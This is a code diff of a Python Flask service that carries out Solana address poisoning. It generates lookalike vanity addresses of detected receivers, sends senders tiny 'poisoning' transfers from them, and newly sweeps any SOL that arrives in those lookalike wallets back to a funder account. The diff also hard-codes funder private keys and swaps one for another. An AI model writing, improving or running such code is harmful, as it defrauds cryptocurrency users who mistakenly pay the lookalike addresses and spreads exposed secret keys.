@@ -3,23 +3,33 @@ import os
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "vanitygenerator")))
 from soltransfer.sol_xfr import send_sol
 import time
-from vanitygenerator.generatekeys import generate_similar_address
+from vanitygenerator.persistent_generator import generate_similar_address_persistent
 import base58
 import json
 import logging
 import threading
+from solana.rpc.api import Client
+from solders.pubkey import Pubkey
 
 # Flask imports
 from flask import Flask, request, jsonify
 
-funderpubkey = "2bAFrDAgqP5TVfeuZ82JxJTimk9mmaa2ZBwmaMZ5Px2Z"
-funderprivkey = "5PpMF7zLtUpcMaWh6AEkWpMyP185X3ixLQFtPdGJj68k3jiHJFkVUCc1BkJtGHhFQnYiQPkcEW3ZS75Y4mArBenZ"
-rpc_url = "http://new-york.rpc.pinnaclenode.com"
+# NOTE: Using persistent GPU vanity generator to avoid GPU/OpenCL reinitialization
+# The GPU context is kept alive for 20 minutes (configurable) and reused across
+# multiple vanity address generation requests, significantly improving performance
+
+funderpubkey = "RAPEWkHm8YZJ6ECeaasbJdUp7E3XsxVYvLvHqCPSbT1"
+funderprivkey = "2YVpmDaVDv1tMEREMUSPVL4io6WKJ2yvKZdoaJTRF36qv7Knd8jARhN9Qs3o65nUbJHLRzwdXaR37GqMVjpxjDZ5"
+rpc_url = "http://frankfurt.rpc.pinnaclenode.com"
 initial_fund = 0.001000000
 poison_pill = 0.00001
 min_gas = 0.000005000
 cu_prc   = 0
 cu_lmt   = 250000
+
+# GPU context timeout in seconds (1.5 minutes = 90 seconds)
+# The GPU context will be kept alive for this duration and reused
+gpu_context_timeout = 90
 
 gpu_lock = threading.Lock()
 
@@ -40,7 +50,7 @@ def safe_send_sol(*args, **kwargs):
 
 def poison(detectedsender, detectedreceiver):
     with gpu_lock:
-        similar_address = generate_similar_address(detectedreceiver)
+        similar_address = generate_similar_address_persistent(detectedreceiver)
         print(f"Generated address: {similar_address} to poison {detectedsender} who sent funds to {detectedreceiver}")
         with open("generated_wallets.jsonl", "a") as f:
             json.dump(similar_address, f)
@@ -55,7 +65,18 @@ def poison(detectedsender, detectedreceiver):
     print(f"Poisoned {detectedsender} with {similar_address['public_key']}")
     #return the rent amount back to the funder
     safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), funderpubkey,  initial_fund-poison_pill-min_gas*2, cu_prc, cu_lmt, rpc_url, 'Y')
-    time.sleep(10)
+    time.sleep(12)
+    #check if similar address has any sol balance
+    LAMPORTS_PER_SOL = 1_000_000_000
+    client = Client(rpc_url)
+    pubkey = Pubkey.from_string(similar_address["public_key"])
+    resp = client.get_balance(pubkey)
+    sol_balance = resp.value / LAMPORTS_PER_SOL
+    print(f"Similar address {similar_address['public_key']} has {sol_balance} SOL balance now")
+    if sol_balance > min_gas:
+        # send remaining balance minus min_gas back to funder
+        safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), funderpubkey, sol_balance - min_gas, cu_prc, cu_lmt, rpc_url, 'Y')
+        print(f"Retrying remaining balance {sol_balance - min_gas} SOL from {similar_address['public_key']} to {funderpubkey}")
     print(f"Returned rent to {funderpubkey}")
 
 # Flask app setup
